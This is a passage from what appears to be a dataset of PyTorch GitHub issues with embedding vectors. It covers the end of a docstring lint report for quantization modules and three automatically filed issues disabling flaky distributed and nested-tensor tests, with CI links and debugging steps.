fake_quantize.py:524 in public function `enable_observer`:
        D400: First line should end with a period (not ':')
fuse_modules.py:1 at module level:
        D100: Missing docstring in public module
fuse_modules.py:39 in public function `fuse_known_modules`:
        D205: 1 blank line required between summary line and description (found 0)
fuse_modules.py:39 in public function `fuse_known_modules`:
        D400: First line should end with a period (not 'd')
fuse_modules.py:39 in public function `fuse_known_modules`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fuse_modules.py:104 in public function `fuse_modules`:
        D400: First line should end with a period (not 'e')
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D200: One-line docstring should fit on one line with quotes (found 2)
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D210: No whitespaces allowed surrounding docstring text
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D400: First line should end with a period (not '`')
fuser_method_mappings.py:1 at module level:
        D100: Missing docstring in public module
fuser_method_mappings.py:18 in public function `fuse_conv_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:55 in public function `fuse_conv_bn_relu`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:102 in public function `fuse_linear_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:131 in public function `fuse_convtranspose_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D400: First line should end with a period (not 's')
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D400: First line should end with a period (not ',')
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D400: First line should end with a period (not ',')
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D400: First line should end with a period (not 'd')
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D401: First line should be in imperative mood; try rephrasing (found 'This')
```

### Suggest a potential alternative/fix

_No response_

cc @svekars @carljparker",False,"[-3.81182790e-01 -2.06864402e-01 -1.05589643e-01 -5.20925187e-02
  3.28013301e-01 -9.83207524e-02  4.02591050e-01  1.36995256e-01
 -4.97569948e-01 -1.31003857e-02  9.76892710e-02 -4.85981181e-02
  1.93643212e-01  2.90840387e-01  7.83384126e-03  7.90756345e-02
 -3.04811537e-01 -1.97561711e-01  1.18225187e-01 -8.33534077e-02
  1.92957103e-01  1.82804331e-01 -1.25411868e-01  1.25320196e-01
 -8.29193890e-02  2.38438874e-01 -2.46519536e-01 -2.94498563e-01
  6.21533580e-02  2.07036585e-01  1.49642587e-01  3.08324635e-01
 -4.02780533e-01 -9.58695859e-02  4.48825866e-01  9.81992334e-02
 -2.41816118e-01  1.53298080e-01  3.58418748e-02 -9.85120982e-02
 -4.22523730e-02 -1.52905673e-01  3.23842093e-02  1.46251380e-01
 -2.07283974e-01 -2.94815421e-01 -2.82814145e-01  3.50362360e-01
 -3.46398830e-01 -4.42153849e-02 -8.48633647e-02  1.46804661e-01
 -4.80659425e-01 -4.41146977e-02  2.91481614e-01 -1.88109785e-01
 -1.05293375e-02  3.15397590e-01 -2.09840506e-01 -1.47469848e-01
  1.45771071e-01  2.30648994e-01  2.59131715e-02  1.50746956e-01
 -3.39916319e-01  2.41861671e-01  1.66746825e-01  4.01963651e-01
  5.78514934e-01  2.20340956e-02 -3.09137367e-02  3.39066908e-02
 -2.30809808e-01 -5.10702170e-02  2.08317727e-01  2.31732190e-01
 -4.28880572e-01  7.36952797e-02 -1.59074962e-01 -2.11486474e-01
 -1.25317514e-01 -1.18651517e-01  9.12299305e-02 -8.39043409e-02
  4.86411601e-02 -1.26767904e-02  4.11528274e-02  8.06458816e-02
  1.37421966e-01  1.43582970e-01  3.88579339e-01 -7.40337819e-02
  1.07354037e-01  3.90634000e-01  1.97068512e-01  3.52003545e-01
 -1.53654307e-01 -2.70400196e-01  1.90527841e-01 -1.94561034e-01
 -3.54271904e-02 -5.34668088e-01 -2.45278671e-01  3.54303747e-01
  1.66244432e-01 -1.40247062e-01  1.86105713e-01  1.26355231e-01
  3.84230316e-01  3.62460241e-02  5.41148968e-02 -1.84501201e-01
  2.34698460e-01  4.11317758e-02  2.11242586e-01  1.12106182e-01
 -1.47499815e-01 -7.74432197e-02 -2.59272397e-01  1.35057777e-01
  3.24125499e-01  5.24237752e-01  2.13511318e-01  3.54377866e-01
  2.07836181e-01 -2.33950615e-02  1.74409211e-01 -9.33972597e-02
  2.99832255e-01 -1.45925442e-02  3.17539662e-01 -4.41017225e-02
 -2.43054643e-01  1.98261812e-01  1.83122128e-01 -5.74957319e-02
 -1.94117904e-01 -1.39455900e-01 -1.14872873e-01  1.88772321e-01
 -4.93207455e-01 -9.04988497e-02 -2.23910376e-01 -2.10011005e-01
  2.66506314e-01  5.79190552e-01 -4.00827348e-01  4.00629610e-01
  1.62583798e-01 -3.22077200e-02 -1.99390054e-02 -1.11364469e-01
 -2.98618555e-01  3.45034570e-01  9.11477022e-03  1.64277643e-01
  4.50153172e-01  1.59587950e-01  3.03408243e-02 -4.50548351e-01
  5.43164322e-03  8.98219422e-02  6.67105392e-02 -1.31233305e-01
 -2.43085280e-01  5.43737635e-02 -2.66194224e-01 -7.24495798e-02
 -4.72981095e-01 -5.08395955e-04  2.13274918e-02  1.36897475e-01
 -8.58875066e-02 -4.13449593e-02  8.60466436e-02  6.58222437e-02
 -3.60468090e-01 -4.20054823e-01  4.35581207e-02  2.42653593e-01
  5.42145036e-02  5.57472169e-01  2.01052561e-01  1.21389255e-01
 -1.85112236e-03  1.59134194e-02  4.07004774e-01 -2.45145522e-02
 -5.65185137e-02  1.24687836e-01 -1.74587652e-01 -3.76067042e-01
  3.02607775e-01  9.20334235e-02 -1.20237745e-01 -9.36348587e-02
  1.38903141e-01  3.73833805e-01 -2.02662736e-01  1.65773809e-01
 -2.81379968e-01  1.10030910e-02  1.10102810e-01 -6.46118969e-02
  3.95249337e-01  4.75268438e-02 -4.17584270e-01 -5.76267183e-01
 -4.04257566e-01  1.65228218e-01 -4.44046319e-01 -1.75641865e-01
 -2.24378809e-01 -3.21790814e-01 -3.80790323e-01  3.25813055e-01
 -1.32687375e-01 -2.10759193e-01  4.45650011e-01 -1.67198300e-01
 -2.71680951e-01  2.63931751e-02 -2.38156199e-01 -2.12844059e-01
 -1.77129894e-01  2.04173386e-01  1.58307105e-02  1.56406060e-01
 -1.20119445e-01  1.24880701e-01  1.75961941e-01 -6.28593415e-02
  8.37653875e-01  2.35764980e-02  1.66646332e-01  1.83361858e-01
 -2.16488570e-01 -1.30843028e-01 -3.79997380e-02  2.14272141e-01
 -8.95553976e-02  3.66026193e-01  9.51908380e-02  1.74551457e-01
  1.03536002e-01 -2.07640097e-01 -2.85597384e-01 -4.01788801e-01
 -3.31886858e-01  1.86501056e-01 -2.94977665e-01 -6.54699206e-01
  2.01566085e-01 -3.73198390e-02  3.64615858e-01  1.58361211e-01
 -4.36200202e-01 -2.38624781e-01  5.95322028e-02 -2.21098036e-01
 -1.53787494e-01  1.47509754e-01 -1.33445024e-01  4.80415151e-02
  3.00644159e-01 -2.43185550e-01 -6.50737524e-01  2.60120988e-01
 -8.79995078e-02 -1.77670568e-02 -2.09484287e-02 -6.08676434e-01
  4.18980718e-01  2.47589797e-01  3.36496264e-01 -1.07279167e-01
  3.80811512e-01 -1.73151121e-01 -2.48321891e-01  6.38843328e-02
 -1.61783725e-01  4.39415812e-01 -3.45762938e-01  2.25955889e-01
  2.93616891e-01 -3.04052174e-01 -2.79974341e-01  1.41409226e-04
 -4.18995529e-01 -3.12093258e-01 -3.45421672e-01  1.07350051e-02
  2.86985755e-01 -1.36725962e-01  1.67800859e-02  2.19837129e-01
  6.14225864e-03 -6.40348345e-02  2.24685967e-01  2.68897079e-02
 -2.65813738e-01  2.05365688e-01 -3.75121944e-02  4.01163757e-01
  5.37852012e-02  2.85311222e-01  1.20458156e-01  9.07621160e-02
  8.79662782e-02 -2.74181545e-01  4.71157134e-01  2.46679083e-01
  4.11519036e-02  4.08919808e-03 -1.92172140e-01  1.35256067e-01
 -5.01823723e-02  6.04263723e-01  3.03725004e-01  2.56311804e-01
  4.49532736e-03 -4.26616788e-01 -1.16006978e-01  1.44041762e-01
  2.91676261e-04 -8.88180286e-02 -3.02965283e-01 -6.03941502e-03
 -4.34318185e-01 -3.65861803e-01  1.63042158e-01  1.19305074e-01
 -1.20671485e-02  5.05564921e-02  3.58588472e-02  1.17258355e-01
 -1.81276977e-01  1.69882670e-01  1.69315904e-01 -2.15333268e-01
 -1.54896677e-01 -1.50377870e-01  1.48476921e-02 -4.98368263e-01
 -2.84395605e-01  7.87170008e-02  3.01722199e-01  2.03724146e-01
 -1.64531976e-01  1.23517454e-01  3.42717946e-01 -1.92457348e-01
 -2.77108461e-01  7.49040022e-02 -1.87262729e-01  4.89641875e-01
 -9.48178861e-03  1.60122901e-01 -2.19941452e-01  2.46717528e-01
 -6.35228097e-01 -1.49666324e-01 -1.91974908e-01 -4.01108563e-01
  1.23321518e-01 -2.90118337e-01  5.64544797e-02 -2.84802854e-01
 -7.55687654e-02  8.22629780e-02 -2.07098246e-01  2.22874023e-02
 -2.56521583e-01  2.12017387e-01  3.83261114e-01 -2.01646592e-02
  2.18676105e-01  4.20684926e-02 -1.74210757e-01 -2.10616022e-01
 -3.14853609e-01  2.93975472e-01  3.09716165e-01 -2.56248564e-02]"
DISABLED test_2d_optim_state_dict_is_even_sharded_model_False (__main__.TestNew2dParallelStateDict) oncall: distributed triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=periodic%20%2F%20linux-focal-cuda11.8-py3.9-gcc9%20%2F%20test%20(multigpu%2C%201%2C%201%2C%20linux.g5.12xlarge.nvidia.gpu)&jobName=linux-focal-cuda11.8-py3.9-gcc9%20%2F%20test%20(multigpu%2C%201%2C%201%2C%20linux.g5.12xlarge.nvidia.gpu)&failureCaptures=%5B%22distributed%2Ftensor%2Fparallel%2Ftest_fsdp_2d_parallel.py%3A%3ATestNew2dParallelStateDict%3A%3Atest_2d_optim_state_dict_is_even_sharded_model_False%22%5D)).

This test starts failing for multigpu after https://hud.pytorch.org/pytorch/pytorch/commit/9d0c3e21d0b0d7c7a972b56b519b3b2e5732f509

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @fegin",False,"[-0.16598648 -0.11485986 -0.26433188 -0.00988751 -0.06414616 -0.14241979
 -0.02752427  0.10203955 -0.44286364 -0.20819734  0.39428854 -0.03480272
  0.27591142  0.01831971 -0.15352362 -0.20806953 -0.00655383 -0.43993592
  0.22329962  0.16899836 -0.01321284 -0.08518342 -0.2787969   0.01839722
 -0.07138771 -0.04201751 -0.01855731 -0.03131591 -0.07869922  0.06508274
  0.29011896  0.4861797  -0.3849832  -0.08938999  0.2947093  -0.00968404
 -0.10516828 -0.50469136 -0.04480112 -0.04366753 -0.16779178  0.00890723
 -0.14539984  0.02771141 -0.10440989 -0.18034366 -0.04261834  0.24498823
 -0.37984815 -0.25176603  0.1180445   0.04288982 -0.06606098 -0.41261256
  0.19261733 -0.3459062   0.07363701  0.26425177 -0.0973122   0.15010759
  0.18110882 -0.08780341 -0.00874155 -0.0066988  -0.01039391  0.3307124
  0.12315908 -0.46180683  0.5545152   0.04046622 -0.00645693  0.01364023
 -0.23492664 -0.11938396  0.24927552  0.05842255 -0.2524163   0.01950483
 -0.0085877  -0.10194518 -0.01422157 -0.19576989 -0.05809528 -0.1292491
  0.21732935 -0.26034576 -0.02384234 -0.19341263  0.044247   -0.10360208
  0.21655107  0.0883912  -0.07465781  0.20522356  0.08741059  0.14456947
 -0.03370095 -0.13297123 -0.00598473  0.17517897  0.04374375 -0.24298914
 -0.17257032  0.33755207 -0.31252334 -0.08112413  0.2305929   0.04486895
  0.0386937   0.01528331  0.04223787  0.02881809  0.16530086 -0.03602691
  0.0926218  -0.05597238  0.06242796 -0.13597667 -0.04089452 -0.0957638
 -0.1758664  -0.1623553   0.25356066  0.05297228  0.32253334  0.11025527
  0.02834018  0.15108125 -0.08874965 -0.25176302  0.16142851 -0.18275268
 -0.10595006 -0.03160659  0.13727425  0.01689557 -0.06909045 -0.3034675
  0.1203502   0.04009899 -0.20980084  0.07559173  0.14241932 -0.06911982
  0.17863177  0.13834703 -0.19603637  0.33839598  0.11084162  0.2778495
  0.23983286 -0.10040474 -0.03550753  0.37046617  0.04752598  0.12445278
  0.23231868 -0.03426695  0.03506991 -0.13876721 -0.06843904  0.28908753
 -0.19097033  0.07026877  0.23259348  0.05335999 -0.19863835  0.0014921
  0.00731686  0.11602288  0.13962068  0.03249316  0.13958459 -0.06191272
 -0.09716092 -0.0133713  -0.06141091 -0.34109712 -0.14239424  0.3398497
  0.03432142  0.02496809  0.24639624  0.23793994  0.03421681  0.3842092
  0.20340653 -0.07447254 -0.09759431 -0.21888228 -0.55278265 -0.04333415
  0.08529405  0.07752102 -0.25482583 -0.47690147  0.16334079  0.12113973
  0.04116654  0.0882737  -0.01331703  0.05754414  0.3203703  -0.21537736
 -0.08985491  0.06070969 -0.11724082 -0.2264697   0.35919166  0.10379783
 -0.44073856 -0.20557757 -0.24355778 -0.30897915 -0.15841606 -0.0173652
 -0.01086012 -0.08281215  0.05768707  0.22754733  0.06986354 -0.16702224
 -0.09532513 -0.26758015 -0.22031468  0.11631295 -0.08553687  0.20471913
 -0.06156686 -0.00821255 -0.03009606 -0.21517405  0.0538515   0.09163567
  0.39245018 -0.09013794 -0.08693127 -0.1478799  -0.20145643  0.31160998
 -0.18753721 -0.3618183  -0.11157183 -0.02855245  0.08172511  0.28177822
 -0.22692403  0.08388418 -0.05168727  0.1669305  -0.19575298 -0.25689048
  0.16317417 -0.07397829  0.28021687  0.1888169   0.01187049 -0.02433997
  0.20118421  0.08885805 -0.05115842  0.43588042 -0.20393234  0.5320451
  0.30054617  0.11161294 -0.13277932  0.27596727 -0.09864782  0.03193473
  0.18910328 -0.41320428  0.01331259  0.02789107  0.21155259 -0.16941382
  0.3748387  -0.16686776 -0.00358405  0.03508228  0.10902654  0.12914258
  0.02730824  0.00973303  0.26341134 -0.07828283 -0.15991992 -0.22384313
 -0.3775048  -0.28331834 -0.1065193   0.23150961  0.5035213  -0.05804873
 -0.2283225   0.01472344  0.07387251 -0.13915984  0.3193665  -0.25577915
 -0.26932967  0.09700455  0.07697749  0.02667788 -0.19430956 -0.04585021
  0.21434143 -0.10333933  0.4242264  -0.29888612  0.22687447  0.16093087
  0.05650799  0.19036512 -0.18750453  0.07393686 -0.37310487  0.18321428
  0.11341415  0.1877966   0.17811728 -0.12950465 -0.38853502  0.22791052
  0.3248093  -0.23512167 -0.11467772 -0.02071395 -0.04811501 -0.06809667
 -0.05171173  0.12274735 -0.30081624  0.01297409  0.04143823 -0.0858425
 -0.13614151  0.5335701   0.1360191  -0.06773129  0.05966762 -0.15536155
 -0.14384651 -0.2413994  -0.20831698  0.18151647  0.2329366   0.07105625
  0.12952359  0.1638991   0.00646451 -0.04399253 -0.32346871 -0.15693821
 -0.04062573  0.42964175 -0.00985421  0.20322983  0.32496843  0.32344228
 -0.22343618  0.00927537 -0.26161212 -0.04852787  0.05328489 -0.05218013
 -0.17605476 -0.0293022   0.38278893  0.28215683 -0.444344    0.22935964
 -0.21066865 -0.00134512  0.18258414  0.02678862  0.19537422 -0.2970732
 -0.10186221  0.0627947   0.09929134 -0.07332794  0.03799867  0.16594757]"
DISABLED test_transpose_inference_mode_interaction_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: asan, linux, mac, macos

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18345948393).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False,"[-0.51541346 -0.15584573 -0.08631159 -0.32095587 -0.06745803 -0.2293548
  0.10189964 -0.12330183 -0.2628769  -0.40219432  0.5411108  -0.16067278
  0.25851676  0.11782622 -0.0724656  -0.15021904 -0.21433343  0.03597731
  0.49200475  0.00633813 -0.13724178 -0.06600093 -0.32758898  0.14883372
 -0.01050759  0.13204756  0.17814997 -0.00905323  0.1935798   0.07131483
  0.4728428   0.29110873 -0.2420253  -0.10799327  0.29097214  0.15319504
 -0.21824718 -0.25851053 -0.21242154 -0.11755901  0.1733117   0.17158331
  0.10889958 -0.15875939  0.21669805 -0.06481072 -0.15545094  0.07962231
 -0.27997205  0.02933948  0.2558918  -0.08623344 -0.14704213 -0.38729173
  0.08067417 -0.0729633  -0.05399142  0.27210528  0.09619039  0.19013593
  0.16331536  0.01655207 -0.08801559  0.04706893  0.07492936  0.2211862
  0.25553843 -0.20246911  0.47751123  0.13931385 -0.12124712 -0.06776501
 -0.43388873  0.02252147  0.12845653  0.17008248 -0.34029117  0.03652803
 -0.0182731  -0.11566263 -0.08270444 -0.04815636  0.01635755  0.10099112
  0.21170554 -0.11190355  0.11016266 -0.166822    0.10882256 -0.12873414
  0.3245052   0.28425983 -0.10015034 -0.09248691 -0.07400556 -0.15248612
  0.17565075 -0.25836927 -0.16085573  0.23618665  0.02005729 -0.13890073
 -0.19364215  0.27021343 -0.08023333 -0.26713586  0.36595422 -0.02905006
  0.20774901  0.22969721 -0.21207874 -0.08055615  0.06825619 -0.05059878
 -0.12165119 -0.08282438 -0.01293948 -0.00356903  0.2946393   0.32669547
 -0.11633172 -0.21871227  0.03081684  0.1684643   0.4115348  -0.08988243
 -0.3931157   0.11815402  0.06707124 -0.20273015  0.1781117   0.08724943
 -0.11180584 -0.17039849  0.2029098   0.15173846 -0.20654935 -0.3499324
 -0.0529512   0.03946504 -0.20569018 -0.03372173 -0.03673184 -0.12338366
  0.54585165  0.25385898 -0.19596551  0.06398084 -0.10336368 -0.00225848
  0.18824178  0.07763964  0.24643719  0.32077628 -0.06405438  0.04232755
  0.5879147   0.00716097 -0.00318524 -0.12271216 -0.05206067  0.49634743
  0.06943518  0.02278415  0.33916342 -0.15095049 -0.2764511   0.01171857
 -0.00172034  0.13435788 -0.08663677 -0.21107578  0.04694075  0.02214425
  0.00611734 -0.12840539  0.21539049 -0.3017696  -0.00990214  0.13220158
 -0.08172495 -0.03372211  0.04326864 -0.02695605 -0.21852773  0.19243999
  0.08003992  0.06609479 -0.1401635  -0.02572293 -0.54536957 -0.24931797
 -0.05811547  0.14362603 -0.2595905  -0.2414998   0.17131153 -0.02759722
  0.04430803  0.1244957  -0.2708132   0.02967333  0.16573563 -0.2772783
 -0.08592955 -0.00444227 -0.05415109 -0.2733226   0.19520777  0.05426511
 -0.11937897 -0.3297823  -0.37879086 -0.1875732  -0.03352897 -0.0336088
  0.03113144  0.13989362 -0.02565089  0.29463857 -0.26761967 -0.0747716
 -0.0309757  -0.13888025 -0.3895676  -0.2274407  -0.26537415  0.17161316
 -0.23358503 -0.01908525  0.06820985 -0.33138794  0.41891083 -0.09152021
  0.12682058 -0.18430163 -0.20407113 -0.20258257 -0.1875552   0.3555517
 -0.3733564  -0.25076702 -0.08648852 -0.0149738   0.07347783  0.05344572
  0.2506057   0.01509959 -0.02933968  0.0904454  -0.12851286 -0.31047884
  0.35111612  0.15948372  0.03335078  0.3420846  -0.07039146  0.05348191
 -0.15255222  0.19659552  0.02953343  0.4619447  -0.0649161   0.4494641
  0.3417539   0.09208283 -0.4414554   0.07282922  0.31743193 -0.15412429
  0.27982724 -0.40485394  0.33027613 -0.11638773  0.27076274 -0.06991076
  0.43908638  0.0490783  -0.03397183  0.09460831  0.10745472  0.04939535
 -0.012202   -0.02840361  0.16650575 -0.3567803  -0.08808929 -0.09557435
 -0.10241948 -0.15810013 -0.07558081  0.08269314  0.33056575 -0.10053273
 -0.38400638  0.00185804  0.2935392  -0.30253035  0.1354818  -0.08728794
 -0.10171203 -0.09999402  0.0375706  -0.3530721   0.09491138 -0.01721279
  0.15721968  0.21295896  0.07834952 -0.22252783  0.36889333  0.33069476
  0.02658612  0.3145005  -0.04223619  0.0994892  -0.17456207  0.4154421
 -0.15198243  0.14129034  0.23940578 -0.3039132  -0.28704077  0.02565405
  0.11595955  0.00859149 -0.38058183 -0.285906    0.06383984 -0.1509814
 -0.11782439  0.10361478 -0.12469673  0.03996726  0.08147308 -0.02829352
 -0.23279917  0.33444327 -0.06669713 -0.15151188 -0.0500344  -0.20747712
  0.02109922 -0.20174514 -0.11900114 -0.10922895  0.27543688  0.37940496
  0.0581942   0.10086896 -0.03944967 -0.0140437  -0.39632273 -0.10006722
  0.22987664  0.5123018   0.05963552 -0.09238557  0.13845566  0.6274476
 -0.4832093   0.02534861 -0.46001852 -0.3060103   0.177465   -0.09141854
  0.09053527 -0.07441399  0.17827749  0.33592534 -0.35503635  0.12639184
 -0.22564572  0.20910802  0.14409615 -0.24223426  0.3819964  -0.32120684
  0.23604909  0.06106275  0.04509913  0.09757874  0.15711093  0.18403172]"
DISABLED test_transpose_inference_mode_interaction_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux, win, windows

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18346853353).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False,"[-4.64915752e-01 -1.16328001e-01 -1.78249136e-01 -2.37964511e-01
 -1.89971775e-01 -2.42853999e-01  1.18172131e-02 -1.52813509e-01
 -2.63316274e-01 -3.67163420e-01  3.60946357e-01 -1.29927173e-01
  2.98478782e-01  1.35885879e-01 -9.94606689e-02 -1.23854905e-01
 -2.22139865e-01  1.02334321e-01  4.64912683e-01 -1.23826144e-02
 -1.37291521e-01 -1.00218199e-01 -3.35470617e-01  7.57816359e-02
  5.42956889e-02  2.70065106e-02  1.91950977e-01 -7.54147246e-02
  1.90908343e-01  1.41770661e-01  4.13539529e-01  2.43938342e-01
 -2.24894047e-01 -1.72428489e-01  1.79162458e-01  1.27300888e-01
 -2.37407357e-01 -2.08750099e-01 -1.31416261e-01 -1.57079145e-01
  2.19836757e-01  2.44157135e-01  5.69178723e-02 -1.01074189e-01
  1.38925135e-01 -6.97417036e-02 -6.19335473e-02  1.24301001e-01
 -3.40612590e-01  4.43998314e-02  1.82089210e-01 -5.64434528e-02
 -1.83623523e-01 -4.33521360e-01 -2.19820831e-02 -2.60999978e-01
 -3.13477106e-02  2.19387189e-01  2.42388025e-02  1.13486513e-01
  1.20300815e-01  3.88869867e-02  8.78027678e-02  1.53527930e-02
 -1.02908887e-01  2.19836548e-01  1.88492730e-01 -1.72881544e-01
  5.52837670e-01  3.04170176e-02 -1.19052961e-01 -2.44359393e-03
 -3.27032149e-01 -2.62137735e-03  9.54533517e-02  1.32745326e-01
 -4.40748334e-01  1.30317330e-01  1.34554897e-02 -1.39995337e-01
  3.39992940e-02 -1.30236655e-01  3.07920929e-02  1.50550708e-01
  2.23025605e-01 -3.39551643e-02  1.01780728e-01 -1.30677819e-01
  2.21737027e-01 -1.36357129e-01  3.77410948e-01  1.87972441e-01
 -6.47234395e-02 -2.57670488e-02 -1.90204889e-01 -6.01506755e-02
  2.03341037e-01 -2.89522827e-01 -1.99670181e-01  1.37744203e-01
  2.73966193e-02 -1.54485181e-01 -2.26330936e-01  3.00856471e-01
  3.08179036e-02 -3.71977061e-01  3.81785095e-01  5.37353680e-02
  1.82432741e-01  1.55722767e-01 -2.02490345e-01 -8.83167908e-02
  8.99580494e-02 -3.52778360e-02 -1.61572888e-01  8.63941386e-04
 -1.39886141e-03  3.07859704e-02  2.13630825e-01  2.43170559e-01
 -9.54848677e-02 -2.23158836e-01  5.08359820e-02  9.03568566e-02
  4.06632930e-01 -1.14486799e-01 -4.38039482e-01  1.30337179e-01
  1.87088162e-01 -8.47480595e-02  2.71621197e-01  2.61794925e-01
 -5.01736999e-02 -2.36123264e-01  2.11172581e-01  5.08180819e-02
 -2.27070510e-01 -3.73395264e-01 -4.78622019e-02  2.36763209e-02
 -1.43889055e-01  1.20272897e-02 -3.41204926e-02 -9.14405882e-02
  3.46273839e-01  2.44578421e-01 -1.77975416e-01  1.45401016e-01
 -1.09631874e-01  5.31932265e-02  8.34830850e-02  2.55788922e-01
  1.79803982e-01  3.30125868e-01 -3.68977264e-02 -3.68229253e-03
  5.02472401e-01 -1.01509206e-02  2.61809491e-02 -1.59447834e-01
 -1.07452691e-01  5.13052106e-01  4.98074815e-02 -3.33725102e-02
  3.32061857e-01 -9.98824239e-02 -2.49335170e-01  8.49908590e-02
  1.26688495e-01  6.58943132e-02  4.08153683e-02 -2.61451185e-01
  6.04826137e-02 -8.75189900e-02 -1.59419402e-02 -2.01488044e-02
  1.84367403e-01 -2.91007489e-01  7.90915266e-02  1.87503576e-01
  3.04650255e-02  3.87887917e-02  1.15575328e-01 -4.88754176e-03
 -2.12549686e-01  2.44191736e-01  1.82214797e-01  1.05017081e-01
 -9.92717817e-02 -8.12167153e-02 -4.75527108e-01 -2.56796300e-01
 -4.56790701e-02  6.35896474e-02 -4.21093881e-01 -2.73047388e-01
  1.43156916e-01  4.64710668e-02  2.93334853e-02  1.01164639e-01
 -1.49019718e-01  7.84570426e-02  2.68833399e-01 -2.71869898e-01
 -4.13202494e-02  2.49303170e-02 -8.97494406e-02 -4.14640635e-01
  2.35257015e-01  5.84384948e-02 -1.84100330e-01 -3.65263879e-01
 -4.47252154e-01 -1.61291704e-01 -9.55627188e-02 -1.67195369e-02
  4.10678461e-02  7.02665821e-02 -9.28505063e-02  3.05281490e-01
 -2.71855116e-01 -3.59602943e-02 -3.40415500e-02 -1.02793157e-01
 -4.42885160e-01 -2.55552411e-01 -1.83413565e-01  1.44335508e-01
 -1.93574160e-01  3.42692211e-02  7.52903894e-02 -4.61619675e-01
  3.51372242e-01 -2.02801116e-02  2.23612264e-01 -1.62333265e-01
 -1.69947043e-01 -9.42902118e-02 -1.75658405e-01  3.95680994e-01
 -3.38573188e-01 -3.47932726e-01 -1.57538414e-01 -7.14477599e-02
  6.45283051e-03  6.75317720e-02  2.67173469e-01 -1.23648457e-02
 -6.92697167e-02 -4.35806811e-04 -1.33082211e-01 -3.21561635e-01
  4.10192072e-01  1.39717728e-01  1.46830767e-01  3.47528309e-01
 -1.23845831e-01  3.10837403e-02 -1.42941430e-01  1.83271572e-01
  1.42179370e-01  5.02464354e-01 -8.96065459e-02  3.73507380e-01
  2.87179172e-01 -9.18330438e-03 -4.17053550e-01  1.15009069e-01
  3.94232333e-01 -1.50455803e-01  3.26012790e-01 -4.54296768e-01
  2.56031960e-01 -7.20576793e-02  2.56675065e-01 -9.66813713e-02
  3.49397212e-01  6.09796345e-02 -8.97038653e-02  3.86049859e-02
  1.39723182e-01  2.49497220e-02  1.13981463e-01 -2.90190056e-02
  2.35057652e-01 -2.33801514e-01 -5.22778332e-02 -1.11105546e-01
 -1.56438738e-01 -1.52550220e-01 -5.28091677e-02  1.07752621e-01
  3.73366952e-01 -1.27700701e-01 -4.04295087e-01 -1.02960199e-01
  2.86302388e-01 -3.15306842e-01  2.20650062e-01 -4.41234931e-02
 -7.62146562e-02 -1.43440649e-01 -4.66429070e-03 -3.63138199e-01
  3.37315053e-02 -4.60938960e-02  1.92260832e-01  1.37133032e-01
  7.11471438e-02 -2.29029447e-01  3.06050867e-01  4.22528118e-01
  3.29678431e-02  3.27427924e-01 -1.43610701e-01  4.89622131e-02
